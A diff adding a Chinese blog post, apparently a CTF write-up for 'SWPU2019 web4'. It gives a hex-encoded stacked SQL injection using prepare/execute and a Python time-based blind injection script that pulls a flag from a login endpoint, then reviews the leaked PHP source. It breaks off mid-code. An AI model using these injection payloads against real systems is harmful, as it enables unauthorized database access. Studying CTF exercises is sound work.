@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="通过这个题目学习到了sql注入一个新的技巧，之前没接触过的，预编译+16进制绕过，然后就是代码的审计 首先点了一下注册按钮，功能还没实现，然后就尝试了一下万能密码，无果，然后在跑了一下字典发现：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SWPU2019 web4">
+<meta property="og:url" content="http://example.com/2020/10/06/SWPU2019%20web4/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="通过这个题目学习到了sql注入一个新的技巧，之前没接触过的，预编译+16进制绕过，然后就是代码的审计 首先点了一下注册按钮，功能还没实现，然后就尝试了一下万能密码，无果，然后在跑了一下字典发现：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/10/06/DtU3ClhN7xqz4JB.png">
+<meta property="article:published_time" content="2020-10-06T04:24:52.000Z">
+<meta property="article:modified_time" content="2024-09-08T04:05:52.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/10/06/DtU3ClhN7xqz4JB.png">
+
+
+<link rel="canonical" href="http://example.com/2020/10/06/SWPU2019%20web4/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2020/10/06/SWPU2019%20web4/","path":"2020/10/06/SWPU2019 web4/","title":"SWPU2019 web4"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SWPU2019 web4 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/06/SWPU2019%20web4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SWPU2019 web4 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SWPU2019 web4
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-10-06 12:24:52" itemprop="dateCreated datePublished" datetime="2020-10-06T12:24:52+08:00">2020-10-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 12:05:52" itemprop="dateModified" datetime="2024-09-08T12:05:52+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>通过这个题目学习到了sql注入一个新的技巧，之前没接触过的，预编译+16进制绕过，然后就是代码的审计</p>
+<p>首先点了一下注册按钮，功能还没实现，然后就尝试了一下万能密码，无果，然后在跑了一下字典发现：</p>
+<span id="more"></span>
+
+<p>单引号时候，会出现php的报错，不是mysql的，所以不可能用到报错注入，然后其他的显示都是 username or password error!</p>
+<p>但是发现，当输入单引号，然后一个分号的时候，发现又成功回显，而不是返回的500，说明分号在这里起到效果了，可能存在堆叠注入。</p>
+<p>但是因为过滤了很多关键词，所以我们这里尝试一下预编译+16进制 绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set@a=0x73656c65637420696628737562737472282873656c6563742067726f75705f636f6e63617428666c616</span><br><span class="line">7292066726f6d20666c6167292c7b307d2c31293d277b317d272c736c6565702833292c3129;</span><br><span class="line">prepare ctftest from @a;execute ctftest;</span><br></pre></td></tr></table></figure>
+
+<p>这里的16进制转成ASCII 就是简单的一个盲注语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(substr((select group_concat(flag) from flag),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;,sleep(3),1)</span><br></pre></td></tr></table></figure>
+
+<p>然后写一个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line">url=<span class="string">&quot;http://0f763aa6-1a38-48f6-86f9-0b25184ba0eb.node3.buuoj.cn/index.php?r=Login/Login&quot;</span></span><br><span class="line">dicts=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#123;&#125;&quot;</span></span><br><span class="line">exp=<span class="string">&quot;select if(substr((select group_concat(flag) from flag),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;,sleep(3),1)&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line">       <span class="keyword">for</span> char <span class="keyword">in</span> dicts:</span><br><span class="line">          r=requests.session()</span><br><span class="line">          exps=exp.<span class="built_in">format</span>(i,char)</span><br><span class="line">          exp2=str_to_hex(exps)</span><br><span class="line">          payload=<span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest -- &quot;</span>.<span class="built_in">format</span>(exp2)</span><br><span class="line">          data=&#123;<span class="string">&quot;username&quot;</span>:payload,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">          <span class="keyword">try</span>:</span><br><span class="line">            res=r.post(url=url,json=data,timeout=<span class="number">2</span>)</span><br><span class="line">          <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">global</span>  flag</span><br><span class="line">            flag+=char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有几个地方，一开始死活打不出来</p>
+<p>第一个点发现 url 那里错了 ，r&#x3D;Login&#x2F;Login 被我写成了 Login&#x2F;Index </p>
+<p>这里的数据是传到了 Login&#x2F;Login </p>
+<p>然后第二个点是 用 json格式传过去 ，所以需要json格式转换一下</p>
+<p>第三个点是 payload 那里 结尾 可以用 ; ，或者 –空格 来注释后面的语句，一定要有空格，然后分号那里，虽然最后是 ‘语句1’；语句2；语句3; ’ 最后多了一个引号，堆叠是一个一个执行的。1,2,3 都是正常执行的，到最后一个引号那里会报错，不过问题不大。</p>
+<p>第四个点就是 flag 变量那里，我一开始在函数外定义了一个 flag, 我在函数里面直接引用是会报错的，需要用到一个关键词 global 来定义全局变量。</p>
+<p>最后爆破得到:</p>
+<p>glzjin_wants_a_girl_friend.zip</p>
+<p>访问拿到源码：</p>
+<p>MVC模式，看一下它的源代码</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义项目路径</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;BASE_PATH&#x27;</span>, <span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;BASR_URL&#x27;</span>, <span class="string">&quot;<span class="subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span>/demo/Blog&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入核心类</span></span><br><span class="line"><span class="keyword">require</span> BASE_PATH . <span class="string">&#x27;/Common/config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> BASE_PATH . <span class="string">&#x27;/Common/fun.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> BASE_PATH . <span class="string">&#x27;/Common/Tools.php&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>导入了核心类</p>
+<p>config.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">DB</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库配置信息</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_DSN&#x27;</span>, <span class="string">&#x27;mysql:dbname=ctf;host=localhost;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;swpuctf2019&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_DATABASE&#x27;</span>, <span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PORT&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHARSET&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认分页大小</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEFAULT_PAGE_SIZE&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>数据库的一些配置信息</p>
+<p>fun.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试函数</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;D&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">D</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">func_get_args</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册自动加载</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;user_aotu_load&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">user_aotu_load</span>(<span class="params"><span class="variable">$className</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$classPath</span> = <span class="string">&#x27;Lib&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strrpos</span>(<span class="variable">$className</span>, <span class="string">&#x27;Controller&#x27;</span>) !== <span class="literal">FALSE</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$classPath</span> = <span class="string">&#x27;Controller&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strrpos</span>(<span class="variable">$className</span>, <span class="string">&#x27;Model&#x27;</span>) !== <span class="literal">FALSE</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$classPath</span> = <span class="string">&#x27;Model&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$classPath</span> = BASE_PATH . <span class="string">&quot;/<span class="subst">&#123;$classPath&#125;</span>/<span class="subst">&#123;$className&#125;</span>.php&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$classPath</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">include</span> <span class="variable">$classPath</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">spl_autoload_register</span>(<span class="string">&#x27;user_aotu_load&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由控制跳转至控制器</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$r</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line">	<span class="keyword">list</span>(<span class="variable">$controller</span>,<span class="variable">$action</span>) = <span class="variable">$r</span>;</span><br><span class="line">	<span class="variable">$controller</span> = <span class="string">&quot;<span class="subst">&#123;$controller&#125;</span>Controller&quot;</span>;</span><br><span class="line">	<span class="variable">$action</span> = <span class="string">&quot;action<span class="subst">&#123;$action&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$controller</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">method_exists</span>(<span class="variable">$controller</span>,<span class="variable">$action</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$action</span> = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$controller</span> = <span class="string">&quot;LoginController&quot;</span>;</span><br><span class="line">        <span class="variable">$action</span> = <span class="string">&quot;actionIndex&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>( (<span class="keyword">new</span> <span class="variable">$controller</span>), <span class="variable">$action</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:index.php?r=Login/Index&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取 request 的参数，如果是空，则跳转到 index.php?r&#x3D;Login&#x2F;Index ，然后以  &#x2F;  为分隔符，来获取参数，一个作为控制器，一个作为方法action</p>
+<p>BaseController.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 所有控制器的父类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 加载视图文件</span></span><br><span class="line"><span class="comment">	 * viewName 视图名称</span></span><br><span class="line"><span class="comment">	 * viewData 视图分配数据</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$viewPath</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span>(<span class="params"><span class="variable">$viewName</span> =<span class="string">&#x27;&#x27;</span>, <span class="variable">$viewData</span> = []</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">&quot;/View/<span class="subst">&#123;$viewName&#125;</span>.php&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">extract</span>(<span class="variable">$viewData</span>);</span><br><span class="line">			<span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类的loadview 方法是 加载视图，把视图导入进来</p>
+<p>LoginController.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 登陆控制器</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$loginModel</span> = <span class="keyword">new</span> <span class="title class_">LoginModel</span>();</span><br><span class="line">        <span class="keyword">if</span>( !<span class="variable">$loginModel</span>-&gt;<span class="title function_ invoke__">loginCheck</span>() ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&quot;userLogin&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&quot;userInfo&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="string">&quot;200&quot;</span>,<span class="string">&quot;info&quot;</span>=&gt;<span class="string">&quot;login success!&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionLogin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$loginModel</span> = <span class="keyword">new</span> <span class="title class_">LoginModel</span>();</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$loginModel</span>-&gt;<span class="title function_ invoke__">loginCheck</span>() ) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadView</span>(<span class="string">&quot;userInfo&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="string">&quot;200&quot;</span>,<span class="string">&quot;info&quot;</span>=&gt;<span class="string">&quot;login success!&quot;</span>)));</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span 